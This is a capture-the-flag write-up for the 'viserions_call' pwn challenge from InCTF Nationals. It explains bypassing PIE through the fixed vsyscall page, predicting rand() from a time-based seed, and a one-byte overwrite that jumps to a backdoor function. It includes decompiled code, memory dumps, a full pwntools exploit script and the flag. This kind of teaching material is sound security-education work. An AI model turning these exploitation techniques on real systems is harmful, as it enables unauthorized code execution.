# viserions_call

Challenge Points:

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

A hard challenge I made for InCTF Nationals Finals round. The protections given on the binary were full, and there was no possibility for leaks. It is based on the concept of making use of a vsyscall to jump to backdoor. Before I proceed, I would just like to state that this challenge does not require any sort of brute approach.

## Preliminary Analysis:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```

## Analyzing the binary:
We see that in main, we are supposed to enter our name and password. They are then passed as arguments to `password_check()`. In password_ check, one can easily notice that the password string is `s3cur3_p4ssw0rd`. We also see that if the password is correct, a random value is being returned by the function. Let us not further look into the decompilation of main.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  time_t v3; // rax
  FILE *v4; // rdi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9
  int res; // [rsp+Ch] [rbp-154h]
  __int64 buf; // [rsp+10h] [rbp-150h] BYREF
  __int64 v13; // [rsp+18h] [rbp-148h]
  __int64 pass; // [rsp+20h] [rbp-140h] BYREF
  __int64 (__fastcall *v15)(); // [rsp+38h] [rbp-128h]
  __int64 v16; // [rsp+40h] [rbp-120h]
  unsigned __int64 v17; // [rsp+158h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  LODWORD(v16) = 0;
  v15 = password_view;
  v3 = time(0LL);
  LOBYTE(v3) = 0;
  srand(v3);
  puts("Please enter your credentials:\nName:");
  read(0, &buf, 0x14uLL);
  fflush(stdin);
  puts("Password:");
  read(0, (char *)&pass + 4, 0x50uLL);
  v4 = stdin;
  fflush(stdin);
  res = password_check((__int64)v4, (__int64)&pass + 4, v5, v6, v7, v8, buf, v13, pass);
  ((void (__fastcall *)(__int64 *))v15)(&buf);
  if ( res == (_DWORD)v16 )
    hidden_func();
  return __readfsqword(0x28u) ^ v17;
}
```
  - Once random value is being stored into `res` after the function call, we see `((void (__fastcall *)(__int64 *))v15)(&buf);`. To proceed further one will to somehow bypass the call on our input buffer as we do not have any address leak, nor is pie disabled. Thus we make use of a concept called vsyscall. 
  
### Vsyscall:

In any Windows/ Unix system, the program space is usually divided into a user space and a kernel space. In Linux, almost all operations in the user mode are encapsulated by glibc, which we can call directly. When it comes to harware operation and kernel, Linux provides us with rich system call functions to help us make requests to the system kernel. 

When we trigger the system call, we save vlues in registers and enter the kernel state to run the kernel function. Once the kernel function is completed, the return value is saved in the corresponding register in memory, and the register will be recovered and converted to user mode. This process needs to consume a certain amount of performance, so it will cause huge memory overhead for the frequently used system call functions. Therefore, Linux maps several common kernel calls from the kernel to the user layer space, thus introducing vsyscall.

In short, the memory of vsyscall stores the code of three system calls. The memory mapping of the code of these three system calls is fixed and will not change due to the opening of the PIE protection mechanism. We should use the code segment syscall;ret to jump to the memory we want to jump to.

We can view the memory layout of the process after execution of the program with PIE enabled. 

```
gdb-peda$ cat /proc/self/maps
55779ba14000-55779ba16000 r--p 00000000 08:09 4849787                    /bin/cat
55779ba16000-55779ba1b000 r-xp 00002000 08:09 4849787                    /bin/cat
55779ba1b000-55779ba1e000 r--p 00007000 08:09 4849787                    /bin/cat
55779ba1e000-55779ba1f000 r--p 00009000 08:09 4849787                    /bin/cat
55779ba1f000-55779ba20000 rw-p 0000a000 08:09 4849787                    /bin/cat
55779bf74000-55779bf95000 rw-p 00000000 00:00 0                          [heap]
7f085d62d000-7f085db9d000 r--p 00000000 08:09 9308748                    /usr/lib/locale/locale-archive
7f085db9d000-7f085dbc2000 r--p 00000000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dbc2000-7f085dd3a000 r-xp 00025000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dd3a000-7f085dd84000 r--p 0019d000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dd84000-7f085dd85000 ---p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dd85000-7f085dd88000 r--p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dd88000-7f085dd8b000 rw-p 001ea000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f085dd8b000-7f085dd91000 rw-p 00000000 00:00 0 
7f085ddb4000-7f085ddd6000 rw-p 00000000 00:00 0 
7f085ddd6000-7f085ddd7000 r--p 00000000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f085ddd7000-7f085ddfa000 r-xp 00001000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f085ddfa000-7f085de02000 r--p 00024000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f085de03000-7f085de04000 r--p 0002c000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f085de04000-7f085de05000 rw-p 0002d000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f085de05000-7f085de06000 rw-p 00000000 00:00 0 
7ffcbf2bc000-7ffcbf2dd000 rw-p 00000000 00:00 0                          [stack]
7ffcbf2f3000-7ffcbf2f6000 r--p 00000000 00:00 0                          [vvar]
7ffcbf2f6000-7ffcbf2f7000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

```
```
gdb-peda$ cat /proc/self/maps
558d734d3000-558d734d5000 r--p 00000000 08:09 4849787                    /bin/cat
558d734d5000-558d734da000 r-xp 00002000 08:09 4849787                    /bin/cat
558d734da000-558d734dd000 r--p 00007000 08:09 4849787                    /bin/cat
558d734dd000-558d734de000 r--p 00009000 08:09 4849787                    /bin/cat
558d734de000-558d734df000 rw-p 0000a000 08:09 4849787                    /bin/cat
558d7506d000-558d7508e000 rw-p 00000000 00:00 0                          [heap]
7f1ffc944000-7f1ffceb4000 r--p 00000000 08:09 9308748                    /usr/lib/locale/locale-archive
7f1ffceb4000-7f1ffced9000 r--p 00000000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffced9000-7f1ffd051000 r-xp 00025000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffd051000-7f1ffd09b000 r--p 0019d000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffd09b000-7f1ffd09c000 ---p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffd09c000-7f1ffd09f000 r--p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffd09f000-7f1ffd0a2000 rw-p 001ea000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so
7f1ffd0a2000-7f1ffd0a8000 rw-p 00000000 00:00 0 
7f1ffd0cb000-7f1ffd0ed000 rw-p 00000000 00:00 0 
7f1ffd0ed000-7f1ffd0ee000 r--p 00000000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f1ffd0ee000-7f1ffd111000 r-xp 00001000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f1ffd111000-7f1ffd119000 r--p 00024000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f1ffd11a000-7f1ffd11b000 r--p 0002c000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f1ffd11b000-7f1ffd11c000 rw-p 0002d000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so
7f1ffd11c000-7f1ffd11d000 rw-p 00000000 00:00 0 
7ffe1a944000-7ffe1a965000 rw-p 00000000 00:00 0                          [stack]
7ffe1a9a3000-7ffe1a9a6000 r--p 00000000 00:00 0                          [vvar]
7ffe1a9a6000-7ffe1a9a7000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

The above memory map is given for a pie enabled binary on different runs. We see that the memory mapping of `vsyscall` is always in the section 
```ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall] 
```
Usually, the position of the three system calls in vsyscall is also fixed. 
```
    seg000:FFFFFFFFFF600000 ; Segment type: Pure code
    seg000:FFFFFFFFFF600000 seg000          segment byte public 'CODE' use64
    seg000:FFFFFFFFFF600000                 assume cs:seg000
    seg000:FFFFFFFFFF600000                 ;org 0FFFFFFFFFF600000h
    seg000:FFFFFFFFFF600000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
    seg000:FFFFFFFFFF600000                 mov     rax, 60h
    seg000:FFFFFFFFFF600007                 syscall                 ; $!
    seg000:FFFFFFFFFF600009                 retn
    seg000:FFFFFFFFFF600009 ; ---------------------------------------------------------------------------
    seg000:FFFFFFFFFF60000A                 align 400h
    seg000:FFFFFFFFFF600400                 mov     rax, 0C9h
    seg000:FFFFFFFFFF600407                 syscall                 ; $!
    seg000:FFFFFFFFFF600409                 retn
    seg000:FFFFFFFFFF600409 ; ---------------------------------------------------------------------------
    seg000:FFFFFFFFFF60040A                 align 400h
    seg000:FFFFFFFFFF600800                 mov     rax, 135h
    seg000:FFFFFFFFFF600807                 syscall                 ; $!
    seg000:FFFFFFFFFF600809                 retn
    seg000:FFFFFFFFFF600809 ; ---------------------------------------------------------------------------
    seg000:FFFFFFFFFF60080A                 align 800h
    seg000:FFFFFFFFFF60080A seg000          ends
```

However, due to the detection mechanism for vsyscall, i.e code only being executed from the headers of these three system calls, one may not be able to choose any arbritrary syscall. We might be prompted with an error. This is also a kind of protection given for vsyscalls. Yet we understand that vsyscall is valuable when pie is enbaled. 

**Now that we have understood the concept behind use of vsyscall, in order to bypass the call on the buffer, we shall give a vsyscall segment address `0xffffffffff600000` and proceed to further checks.**

Once the call on buffer is bypassed, we see a check done on `v16` with the `res` returned from `pass_check`. Since a random value was being returned, now our task is to bypass the random number check. 

### rand() check:
Every time we call the rand() function, it returns a random number. This function is usually used to generate a sequence of random number. But this often gets inconvenient if you want to reproduce the same sequence, for that we set the seed-value before calling rand() function. So essentially you can reset the random sequence generator by setting the seed-value and calling the rand function again it will reproduce the same sequence. You can set the seed value using srand() function. 

This can be done using the ctypes library in python. A libc has also been provided for the same. Thus our script for bypassing rand() check can look something like this! 

```
# python2 

from pwn import *
from ctypes import CDLL

if __name__=="__main__":
	context.log_level="debug"
	
	p = process('./viserions_call', env={"LD_PRELOAD" : "./libc.so.6"})
	#p = remote('gc1.eng.run', 31459)
	libc = CDLL("libc.so.6")
	libc.srand(int(time.time()) & 0xffffff00)
	rand_val = libc.rand()

	gdb.attach(p, gdbscript='''b*main+95\n''')
	
	info("rand : %s"%rand_val)
	
	p.recvuntil('Name:\n')
	p.sendline('abcd')
	
	p.recvuntil('Password:\n')

	pay = b's3cur3_p4ssw0rd\x00'
	pay += b'\x00'*(0x1c - 8 - len(pay))
	pay += p64(0xffffffffff600000)
	pay += p64(rand_val)
	
	p.send(pay)
	
```

Once the check is passed, `hidden_func()` is called.

### hidden_func:
Here is the decompilation for `hidden_func()`:
```
void hidden_func()
{
  __int64 buf[34]; // [rsp+0h] [rbp-110h] BYREF

  buf[33] = __readfsqword(0x28u);
  puts("\nJump to:");
  read(0, buf, 0xFFuLL);
  __asm { jmp     [rbp+buf] }
}

```

As we can see, it reads in 0xff bytes of input stream, and simply jumps to it. Our job is to find a way to call backdoor(). However, with pie enabled and no chance for leaks, one may find it difficult to provide the address for `backdoor` to jump to. 

However, we did see how vsyscall can be use to bypass the call on our buffer. We shall use the same concept, and change some code segment address on the stack to that of `backdoor()`. To do this, we will need to figure out the offset at which a suitable code address can be found on the stack, in order to overwrite the last byte of the address with that of backdoor's since we know for sure, even if pie is enabled the last 3 nibbles will always be the same. **Bruteforce is not needed.**


### checking for offset:

One can refer the below memory dump to find the offset. I have made use of a code segment address that was closest to the the backdoor function, so I will only have to change the last byte in order to jump to backdoor. 

```
gdb-peda$ x/40x $rbp-0x110
0x7ffcbed28130:	0x0000000000000d68	0x000000000000000a
0x7ffcbed28140:	0x00007f5304e716a0	0x000055b05bcd21c6
0x7ffcbed28150:	0x000055b05bcd4020	0x00007f5304e724a0
0x7ffcbed28160:	0x0000000000000000	0x00007f5304d19013
0x7ffcbed28170:	0x0000000000000011	0x00007f5304e716a0
0x7ffcbed28180:	0x000055b05bcd21c6	0x00007f5304ccf9c1
0x7ffcbed28190:	0x3bd948140000000f	0x4c85c70512f5c200
0x7ffcbed281a0:	0x000055b05bcd1200	0x00007f5304ccfe9d
0x7ffcbed281b0:	0x0000000000000000	0x000055b05bcd1418
0x7ffcbed281c0:	0x0000000000000d68	0x0000000f0000000a
0x7ffcbed281d0:	0x705f337275633373	0x0064723077737334
0x7ffcbed281e0:	0x000055b000000000	0x4c85c70512f5c200
0x7ffcbed281f0:	0x0000000000000000	0x000055b05bcd1650
0x7ffcbed28200:	0x00007ffcbed283b0	0x000055b05bcd1594
0x7ffcbed28210:	0x0000000a64636261	0x0000000000000000
0x7ffcbed28220:	0x7563337300000000	0x77737334705f3372
0x7ffcbed28230:	0x0000000000647230	0x4c85c70512f5c200
0x7ffcbed28240:	0x00007ffcbed283b0	0x000055b05bcd15c9
0x7ffcbed28250:	0x0000000000000000	0x3bd9481400000000
0x7ffcbed28260:	0x0000000061d973dd	0x00000000000e4ee8
gdb-peda$ p backdoor
$4 = {<text variable, no debug info>} 0x55b05bcd15df <backdoor>
gdb-peda$ p 0x7ffcbed28208 - 0x7ffcbed28130
$5 = 0xd8
gdb-peda$ 

```

We see that, the address of `backdoor` is `0x55b05bcd15df` and the address at the 27th offset on the stack can be used to overwrite it to that of the backdoor function, using a single byte overwrite. Therefore our second part of the payload can look something like:

```
ret_addr = 0xffffffffff600000
pay = p64(ret_addr)*27+'\xdf'

```

## Exploit:
```python=

from pwn import *
from ctypes import CDLL

if __name__=="__main__":
	context.log_level="debug"
	
	p = process('./viserions_call', env={"LD_PRELOAD" : "./libc.so.6"})
	#p = remote('gc1.eng.run', 31459)
	libc = CDLL("libc.so.6")
	libc.srand(int(time.time()) & 0xffffff00)
	rand_val = libc.rand()

	gdb.attach(p, gdbscript='''b*main+95\n''')
	
	info("rand : %s"%rand_val)
	
	p.recvuntil('Name:\n')
	p.sendline(b'abcd')
	
	p.recvuntil('Password:\n')

	pay = b's3cur3_p4ssw0rd\x00'
	pay += b'\x00'*(0x1c - 8 - len(pay))
	pay += p64(0xffffffffff600000)
	pay += p64(rand_val)

	p.send(pay)

	ret_addr = 0xffffffffff600000
	pay = p64(ret_addr)*27+'\xdf'

	p.send(pay)
	s = p.recv()
	print(s)
p.interactive()
p.close()

```

## Flag:
```
inctf{v1s3r10n_c4ll5_f0r_4_v5y5c4ll_b16bffd956efa6fd}
```

